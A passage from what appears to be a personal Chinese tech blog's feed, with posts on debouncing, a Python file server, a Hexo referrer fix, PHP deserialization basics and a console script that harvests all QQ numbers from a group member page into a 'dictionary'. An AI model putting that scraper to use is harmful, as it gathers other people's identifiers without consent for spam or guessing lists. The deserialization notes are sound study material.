class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">debounce</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">fn</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">delay</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">immediate</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">let</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">timer</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> (...</span><span style="color: #9CDCFE">args</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">context</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">timer</span><span style="color: #D4D4D4">) </span><span style="color: #DCDCAA">clearTimeout</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">timer</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">immediate</span><span style="color: #D4D4D4"> &amp;&amp; !</span><span style="color: #9CDCFE">timer</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">fn</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">apply</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">args</span><span style="color: #D4D4D4">); </span><span style="color: #6A9955">// 首次立即执行</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">timer</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">setTimeout</span><span style="color: #D4D4D4">(() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (!</span><span style="color: #9CDCFE">immediate</span><span style="color: #D4D4D4">) </span><span style="color: #9CDCFE">fn</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">apply</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">args</span><span style="color: #D4D4D4">); </span><span style="color: #6A9955">// 非立即执行逻辑</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">timer</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }, </span><span style="color: #9CDCFE">delay</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  };</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>这种变种适用场景例如：</p><ul><li>用户首次输入时立即触发搜索建议</li><li>防止按钮被连续点击：首次有效，接下来点击无效</li><li>页面初始化后的 resize 初始化布局等</li></ul><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><table><thead><tr><th>类型</th><th>执行时机</th><th>典型场景</th></tr></thead><tbody><tr><td>防抖 Debounce</td><td> 停止触发后一段时间执行</td><td>输入框搜索、滚动监听、resize</td></tr><tr><td> 节流 Throttle</td><td> 固定频率执行</td><td>上拉加载、鼠标移动、FPS 控制等</td></tr><tr><td>立即执行防抖</td><td>首次触发立即执行</td><td>快速响应用户操作（防重复点击）</td></tr></tbody></table><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 python 创建简易的 http 服务传递文件</title>
      <link href="/posts/22192.html"/>
      <url>/posts/22192.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><meta name="description" content="使用python创建简易的http服务传递文件">## 1、cd命令到你想要起服务的目录<figure class="shiki sh"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">cd</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">/var/www/html</span></span><span class="line"><span style="color: #DCDCAA">/*仅举例*/</span></span></code></pre></div></div></figure><h2 id="2-在终端运行"><a class="markdownIt-Anchor" href="#2-在终端运行"></a> 2、在终端运行</h2><figure class="shiki sh"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">python3.8</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">-m</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">http.server</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">7777</span><span style="color: #CE9178">（python3）</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">python3.8</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">-m</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">SimpleHTTPServer</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">6666</span><span style="color: #CE9178">（python2）</span></span></code></pre></div></div></figure><p>请将上面的四位数数字端口号替换成你想要的端口，不出意外你会得到</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202303111111599.png" alt="image-20230311111120223"></p><p>这样就是正常的了。</p><h2 id="3-连接"><a class="markdownIt-Anchor" href="#3-连接"></a> 3、连接</h2><p>Linux 系统下：<br>如果你是虚拟机，请使用 <code>ifconfig</code> 查询到你的 ip，然后用 <strong>你查询到的 ip: 端口</strong> 进行连接；<br>如果你是公网服务器，直接使用 <strong>你的公网 ip: 端口</strong> 即可（请记得开放你所需要的端口）</p><p>Win 的话，查询 <code>ip</code> 请使用 <code>ipconfig</code><br>连接操作和上面一致</p><p>连接效果如下</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202303111116954.png" alt="image-20230311111615917"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 随想随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> http </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决 hexo 主题无法显示使用相对路径的图床图片</title>
      <link href="/posts/55208.html"/>
      <url>/posts/55208.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><meta name="description" content="解决hexo主题无法显示使用相对路径的图床图片">## 问题情况<p>本地预览查看明明使用图床的图片缺无法正常显示，报 403 问题，显示如下</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/image-20240626004028362.png" alt="image-20240626004028362"></p><h2 id="原因"><a class="markdownIt-Anchor" href="#原因"></a> 原因</h2><p>http 请求体的 header 中有一个 referrer 字段，用来表示发起 http 请求的源地址信息，这个 referrer 信息是可以省略但是不可修改的，只能设置是否带上这个 referrer 信息，而不能定制 referrer 里面的值。</p><p>服务器端在拿到这个 referrer 值后就可以进行相关的处理，比如图片资源，可以通过 referrer 值判断请求是否来自本站，若不是则返回 403 或者重定向返回其他信息，从而实现图片的防盗链。上面出现 403 就是因为，请求的是别人服务器上的资源，但把自己的 referrer 信息带过去了，被对方服务器拦截返回了 403。</p><h2 id="解决"><a class="markdownIt-Anchor" href="#解决"></a> 解决</h2><p>前端可以通过 meta 来设置 referrer policy (来源策略)，具体参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referrer-Policy">这里</a>。浏览器中 referrer 默认的值是 <code>no-referrer-when-downgrade</code>，就是除了降级请求的情况以外都会带上 referrer 信息。降级请求是指 https 协议的地址去请求 http 协议，所以 403 的情况可以将请求的图片地址换成 http 协议，这样降级请求也不会带上 referrer。另一种推荐的方法是把 referrer 设置成 <code>no-referrer</code>，这样发送请求不会带上 referrer 信息，对方服务器也就无法拦截。</p><p>由于我个人使用的主题为 <code>fluid</code>，暂未找到可以直接修改的配置文件进行添加配置项配置 meta，所以采用的是每次写 md 文档时，在开头加上</p><figure class="shiki html"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">meta</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"referrer"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"no-referrer"</span><span style="color: #D4D4D4"> </span><span style="color: #808080">/&gt;</span></span></code></pre></div></div></figure><p>无需额外设置，如果使用的是 typora 会直接识别</p><p>如果你的主题可以找到配置文件进行 meta 项的添加修改，可以加上下面这句</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">meta(name="referrer" content="no-referrer")</span></span></code></pre></div></div></figure><p>最后别忘了使用 <code>hexo g</code> 重新生成一下，确认可行之后使用 <code>hexo d</code> 同步即可</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 随想随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo图片问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用浏览器爬取 qq 群的用户 qq 号</title>
      <link href="/posts/17306.html"/>
      <url>/posts/17306.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><meta name="description" content="使用浏览器爬取qq群的用户qq号">首先登录[qq群网页版](https://qun.qq.com/member.html)在控制台中运行js脚本提取qq号码:<figure class="shiki javascript"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">var</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">qq_sl</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getElementById</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"groupMemberNum"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #569CD6">var</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">qq_js</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">Math</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">trunc</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">qq_sl</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">innerHTML</span><span style="color: #D4D4D4"> / </span><span style="color: #B5CEA8">21</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #569CD6">var</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">qq_number</span><span style="color: #D4D4D4"> = </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #9CDCFE">window</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">scrollTo</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">body</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">scrollHeight</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #569CD6">var</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">qq_ds</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">setInterval</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">window</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">scrollTo</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">body</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">scrollHeight</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">qq_number</span><span style="color: #D4D4D4">++;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"正在加载所有页面："</span><span style="color: #D4D4D4"> + </span><span style="color: #9CDCFE">qq_number</span><span style="color: #D4D4D4"> + </span><span style="color: #CE9178">"/"</span><span style="color: #D4D4D4"> + </span><span style="color: #9CDCFE">qq_js</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">qq_js</span><span style="color: #D4D4D4"> &lt;= </span><span style="color: #9CDCFE">qq_number</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">clearInterval</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">qq_ds</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"加载完毕，正在获取页面所有QQ号码..."</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">var</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">classan</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getElementsByClassName</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"mb"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">var</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">number</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">classan</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">length</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">for</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">nr</span><span style="color: #D4D4D4"> = </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">; </span><span style="color: #9CDCFE">nr</span><span style="color: #D4D4D4"> &lt; </span><span style="color: #9CDCFE">number</span><span style="color: #D4D4D4">; </span><span style="color: #9CDCFE">nr</span><span style="color: #D4D4D4">++) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">var</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class_qq</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">classan</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">nr</span><span style="color: #D4D4D4">].</span><span style="color: #DCDCAA">getAttribute</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"class"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">var</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">qq</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">qq</span><span style="color: #D4D4D4"> + </span><span style="color: #CE9178">"</span><span style="color: #D7BA7D">\n</span><span style="color: #CE9178">"</span><span style="color: #D4D4D4"> + </span><span style="color: #9CDCFE">class_qq</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">substring</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">5</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">qq</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}, </span><span style="color: #B5CEA8">500</span><span style="color: #D4D4D4">);</span></span></code></pre></div></div></figure><p>生成字典，自行手动储存。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 随想随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php 反序列化</title>
      <link href="/posts/91123.html"/>
      <url>/posts/91123.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>仅作留档。</p><h2 id="php反序列化"><a class="markdownIt-Anchor" href="#php反序列化"></a> php 反序列化</h2><p>定义：序列化就是将对象转换成字符串。反序列化相反，数据的格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象。</p><p>漏洞原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化的过程，从而导致代码执行，SQL 注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">serialize</span><span style="color: #D4D4D4">()</span><span style="color: #6A9955">//将一个对象转换成要给字符串</span></span><span class="line"><span style="color: #DCDCAA">unserialize</span><span style="color: #D4D4D4">()</span><span style="color: #6A9955">//将字符串还原成一个对象触发： unserialize函数的变量可控，文件中存在可利用的类，类中有魔术方法</span></span><span class="line"><span style="color: #DCDCAA">__toString</span><span style="color: #D4D4D4">()</span><span style="color: #6A9955">//方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时</span></span><span class="line"><span style="color: #DCDCAA">__construct</span><span style="color: #D4D4D4">()</span><span style="color: #6A9955">//创建对象时触发</span></span><span class="line"><span style="color: #DCDCAA">__destruct</span><span style="color: #D4D4D4">()</span><span style="color: #6A9955">//对象被销毁时触发</span></span><span class="line"><span style="color: #DCDCAA">__wakeup</span><span style="color: #D4D4D4">()</span><span style="color: #6A9955">//在使用unserialize()时，会检查是否存在一个__wakeup()魔术方法。如果存在，则该方法会先被调用，预先准备对象需要的资源。</span></span><span class="line"><span style="color: #DCDCAA">__call</span><span style="color: #D4D4D4">()</span><span style="color: #6A9955">//在对象上下文中调用不可访问的方法时触发</span></span><span class="line"><span style="color: #DCDCAA">__invoke</span><span style="color: #D4D4D4">()</span><span style="color: #6A9955">//在脚本尝试将对象调用为函数时触发</span></span><span class="line"><span style="color: #DCDCAA">__callStatic</span><span style="color: #D4D4D4">()</span><span style="color: #6A9955">//在静态上下文中调用不可访问的方法时触发</span></span><span class="line"><span style="color: #DCDCAA">__get</span><span style="color: #D4D4D4">()</span><span style="color: #6A9955">//用于从不可访问的属性读取数据</span></span><span class="line"><span style="color: #DCDCAA">__set</span><span style="color: #D4D4D4">()</span><span style="color: #6A9955">//用于将数据写入不可访问的属性</span></span><span class="line"><span style="color: #DCDCAA">__isset</span><span style="color: #D4D4D4">() </span><span style="color: #6A9955">//在不可访问的属性上调用isset()或empty()触发</span></span><span class="line"><span style="color: #DCDCAA">__unset</span><span style="color: #D4D4D4">()</span><span style="color: #6A9955">//在不可访问的属性上使用unset()时触发</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221445041.png" alt="image-20220924112412517"></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221446017.png" alt="image-20220928101409891"></p><h2 id="常用魔术方法"><a class="markdownIt-Anchor" href="#常用魔术方法"></a> 常用魔术方法</h2><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">、__get、__set</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">这两个方法是为在类和他们的父类中没有声明的属性而设计的</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">__get</span><span style="color: #D4D4D4">( </span><span style="color: #9CDCFE">$property</span><span style="color: #D4D4D4"> ) 当调用一个未定义的属性时访问此方法</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">__set</span><span style="color: #D4D4D4">( </span><span style="color: #9CDCFE">$property</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">$value</span><span style="color: #D4D4D4"> ) 给一个未定义的属性赋值时调用</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）</span></span><span class="line"></span><span class="line"><span style="color: #B5CEA8">2</span><span style="color: #D4D4D4">、__isset、__unset</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">__isset</span><span style="color: #D4D4D4">( </span><span style="color: #9CDCFE">$property</span><span style="color: #D4D4D4"> ) </span><span style="color: #DCDCAA">当在一个未定义的属性上调用isset</span><span style="color: #D4D4D4">()函数时调用此方法</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">__unset</span><span style="color: #D4D4D4">( </span><span style="color: #9CDCFE">$property</span><span style="color: #D4D4D4"> ) </span><span style="color: #DCDCAA">当在一个未定义的属性上调用unset</span><span style="color: #D4D4D4">()函数时调用此方法</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）</span></span><span class="line"></span><span class="line"><span style="color: #B5CEA8">3</span><span style="color: #D4D4D4">、__call</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">__call</span><span style="color: #D4D4D4">( </span><span style="color: #9CDCFE">$method</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">$arg_array</span><span style="color: #D4D4D4"> ) </span><span style="color: #DCDCAA">当调用一个未定义</span><span style="color: #D4D4D4">(包括没有权限访问)的方法是调用此方法</span></span><span class="line"></span><span class="line"><span style="color: #B5CEA8">4</span><span style="color: #D4D4D4">、__autoload</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">__autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">注意: 在 __autoload 函数中抛出的异常不能被 </span><span style="color: #C586C0">catch</span><span style="color: #D4D4D4"> 语句块捕获并导致致命错误。</span></span><span class="line"></span><span class="line"><span style="color: #B5CEA8">5</span><span style="color: #D4D4D4">、__construct、__destruct</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">__construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">__destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源</span><span style="color: #D4D4D4">.</span><span style="color: #D4D4D4">，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用</span><span style="color: #D4D4D4">.</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。</span></span><span class="line"></span><span class="line"><span style="color: #B5CEA8">6</span><span style="color: #D4D4D4">、__clone</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">PHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。</span></span><span class="line"></span><span class="line"><span style="color: #B5CEA8">7</span><span style="color: #D4D4D4">、__toString</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">__toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时，如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: </span><span style="color: #569CD6">Object</span><span style="color: #D4D4D4"> of </span><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">test</span><span style="color: #D4D4D4"> could not be converted to string in，此方法必须返回一个字符串。</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符）</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">8、__sleep、__wakeup</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">__sleep 串行化的时候用</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">__wakeup 反串行化的时候调用</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">serialize() 检查类中是否有魔术名称 __sleep 